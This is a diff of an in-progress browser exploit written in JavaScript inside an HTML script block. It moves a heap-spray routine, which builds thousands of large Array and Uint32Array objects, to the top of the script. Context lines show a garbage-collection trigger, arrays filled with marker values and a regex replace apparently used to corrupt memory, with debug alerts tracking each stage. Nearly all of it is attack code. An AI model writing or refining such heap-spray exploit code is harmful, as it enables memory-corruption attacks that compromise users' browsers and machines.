@@ -1,5 +1,19 @@
 <script>	
-alert("start10");
+alert("start11");
+var spray=new Array(0x800);
+var tmp;
+ for(var i=0;i<spray.length;i+=2){
+ spray[i]=new Array(0x1e00);
+ spray[i+1]=new Uint32Array(0x10000/4);
+  tmp=spray[i+1];
+  tmp[0]=i+1;
+  tmp=spray[i];
+ for(var j=0;j<0x1e00;j+=2){
+  tmp[j]=spray;
+  tmp[j+1]=i;
+ }
+}
+alert("spray done");
 function gc() {
     try {
         var c = document.createElement("canvas");
@@ -63,19 +77,7 @@ arrcvs[j]=0xAAAA;
 x.replace(/\d/g, s1);
 alert("ok");
 //alert(arrcvs[0].toString(16));
-var spray=new Array(0x800);
-var tmp;
- for(var i=0;i<spray.length;i+=2){
- spray[i]=new Array(0x1e00);
- spray[i+1]=new Uint32Array(0x10000/4);
-  tmp=spray[i+1];
-  tmp[0]=i+1;
-  tmp=spray[i];
- for(var j=0;j<0x1e00;j+=2){
-  tmp[j]=arrcvs;
-  tmp[j+1]=i;
- }
-}
+
 var a=0;
 var b="";
 while(1){
